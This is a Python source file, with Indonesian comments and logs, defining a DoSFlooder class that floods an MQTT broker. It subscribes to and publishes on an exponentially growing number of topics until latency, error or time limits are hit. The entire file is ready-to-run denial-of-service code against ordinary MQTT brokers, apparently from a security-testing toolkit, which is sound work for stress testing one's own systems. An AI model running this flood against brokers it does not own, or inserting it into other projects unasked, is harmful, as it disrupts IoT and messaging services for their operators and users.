import time
import paho.mqtt.client as mqtt
from core.tls_utils import setup_tls_context


class DoSFlooder:
    def __init__(self, broker_ip, port=1883, username=None, password=None,
                 qos=0, retain=False, delay=0.005, use_tls=False,
                 allow_insecure=True, logger=None):
        self.broker_ip = broker_ip
        self.port = port
        self.username = username
        self.password = password
        self.qos = qos
        self.retain = retain
        self.use_tls = use_tls
        self.allow_insecure = allow_insecure
        self.logger = logger

    def log(self, message):
        if self.logger:
            self.logger(message)
        else:
            print(message)

    def run(self, max_duration=10, initial_topics=10, max_topic_limit=1000):
        try:
            client = mqtt.Client()
            if self.username and self.password:
                client.username_pw_set(self.username, self.password)

            if self.use_tls:
                setup_tls_context(client, allow_insecure=self.allow_insecure, logger=self.logger)

            client.connect(self.broker_ip, self.port, 60)
            client.loop_start()

            topic_count = initial_topics
            total_payload_sent = 0
            total_topics_used = 0
            start_time = time.time()

            while topic_count <= max_topic_limit:
                topics = [f"flood/topic/{i}" for i in range(topic_count)]
                self.log(f"[*] Menguji dengan {topic_count} topik...")

                # Subscribe semua topik
                for topic in topics:
                    client.subscribe(topic)
                    time.sleep(0.001)  # kecil saja supaya tidak cepat overload

                total_topics_used += len(topics)
                errors = 0
                batch_payload_size = 0

                # Kirim payload ke semua topik
                publish_start = time.time()
                for topic in topics:
                    payload = f"FLOOD_{topic}_{int(time.time()*1000)}"
                    result = client.publish(topic, payload, qos=self.qos, retain=self.retain)
                    if result.rc != mqtt.MQTT_ERR_SUCCESS:
                        errors += 1
                    batch_payload_size += len(payload.encode('utf-8'))
                    total_payload_sent += 1
                    time.sleep(0.001)
                publish_end = time.time()

                elapsed = publish_end - publish_start
                error_rate = (errors / len(topics)) * 100

                self.log(f"[✓] Dikirim ke {len(topics)} topik dalam {elapsed:.3f}s | Error: {errors} ({error_rate:.1f}%)")

                if elapsed > 2.0:
                    self.log("[!] Dihentikan: Deteksi delay tinggi (>2 detik).")
                    break
                if error_rate > 30:
                    self.log("[!] Dihentikan: Banyak publish gagal (>30%).")
                    break
                if (time.time() - start_time) > max_duration:
                    self.log("[!] Dihentikan: Melebihi durasi maksimal.")
                    break

                topic_count *= 2  # eksponensial naik

            client.loop_stop()
            client.disconnect()

            # Ringkasan hasil
            total_payload_size_kb = batch_payload_size / 1024
            self.log(f"[✓] DoS flood selesai: {total_payload_sent} pesan, {total_topics_used} topik.")
            self.log(f"[✓] Ukuran payload total: {total_payload_size_kb:.2f} KB")

            return {
                "total_messages": total_payload_sent,
                "total_topics": total_topics_used,
                "payload_size_kb": total_payload_size_kb,
                "reason": "Delay tinggi" if elapsed > 2.0 else
                          "Terlalu banyak error" if error_rate > 30 else
                          "Batas waktu"
            }

        except Exception as e:
            self.log(f"[!] Subscribe Flood gagal - {e}")
            return {
                "total_messages": 0,
                "total_topics": 0,
                "payload_size_kb": 0,
                "reason": f"Exception: {str(e)}"
            }
